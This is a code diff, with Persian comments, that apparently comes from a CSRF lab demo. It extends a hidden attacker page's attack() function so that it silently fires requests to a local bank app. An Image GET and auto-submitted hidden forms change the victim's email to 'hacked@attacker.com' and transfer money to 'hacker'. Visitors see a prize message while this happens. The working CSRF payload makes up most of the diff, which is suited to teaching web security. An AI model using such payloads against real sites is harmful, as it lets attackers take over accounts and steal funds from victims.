@@ -31,30 +31,49 @@ app.get('/', (req, res) => {
             <iframe id="hiddenFrame" style="display:none"></iframe>
             
             <script>
-                function attack() {
-                    // روش 1: حمله GET از طریق Image
+                    function attack() {
+                    // حمله 1: GET روش Image برای transfer (اگر از GET پشتیبانی کند)
                     const img = new Image();
-                    img.src = 'http://localhost:3000/transfer?to=hacker&amount=5000';
+                    img.src = 'http://localhost:3000/transfer?to=hacker&amount=200';
                     img.style.display = 'none';
                     document.body.appendChild(img);
+
+                    // حمله 2: POST روش فرم خودکار برای change-email
+                    const form1 = document.createElement('form');
+                    form1.method = 'POST';
+                    form1.action = 'http://localhost:3000/change-email';
+                    form1.target = 'hiddenFrame';
                     
-                    // روش 2: حمله POST از طریق فرم خودکار
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'http://localhost:3000/change-email';
-                    form.target = 'hiddenFrame';
+                    const input1 = document.createElement('input');
+                    input1.name = 'email';
+                    input1.value = 'hacked@attacker.com';
+                    form1.appendChild(input1);
                     
-                    const input = document.createElement('input');
-                    input.name = 'email';
-                    input.value = 'hacked@attacker.com';
-                    form.appendChild(input);
+                    document.body.appendChild(form1);
+                    form1.submit();
+
+                    // حمله 3: POST روش فرم خودکار برای transfer
+                    const form2 = document.createElement('form');
+                    form2.method = 'POST';
+                    form2.action = 'http://localhost:3000/transfer';
+                    form2.target = 'hiddenFrame';
                     
-                    document.body.appendChild(form);
-                    form.submit();
+                    const inputTo = document.createElement('input');
+                    inputTo.name = 'to';
+                    inputTo.value = 'hacker';
+                    form2.appendChild(inputTo);
                     
+                    const inputAmount = document.createElement('input');
+                    inputAmount.name = 'amount';
+                    inputAmount.value = '200';
+                    form2.appendChild(inputAmount);
+                    
+                    document.body.appendChild(form2);
+                    form2.submit();
+
                     document.getElementById('result').innerHTML = 
-                        '<p style="color:green">✅ جایزه شما در حال ارسال است...</p>' +
-                        '<p style="color:red; font-size:12px">(در پس‌زمینه، عملیات بانکی انجام شد!)</p>';
+                        '<p style="color:green">✅ حملات انجام شد!</p>' +
+                        '<p style="color:red; font-size:12px">(در پس‌زمینه، تغییر ایمیل و انتقال وجه انجام شد)</p>';
                 }
             </script>
         </body>
